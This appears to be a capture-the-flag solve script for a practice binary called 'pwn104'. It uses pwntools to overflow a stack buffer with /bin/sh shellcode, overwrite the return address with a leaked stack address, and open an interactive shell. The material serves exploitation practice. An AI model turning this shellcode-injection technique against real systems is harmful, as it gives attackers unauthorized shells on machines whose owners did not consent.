from pwn import *

context.arch = 'amd64'

DEBUG = 0
if DEBUG == 0 : 
    p = process("./pwn104")
else:
    p = remote("", 9004)

p.recvuntil(b"I'm waiting for you at")
addr=p.recvline().strip().decode()
addr = int(addr, 16)

shellcode = asm(shellcraft.sh())
offset = 88 - len(shellcode)
payload = shellcode
payload += b'a'* offset  + p64(addr)

with open("payload", 'wb') as f:
    f.write(payload)

p.sendline(payload)
p.interactive()
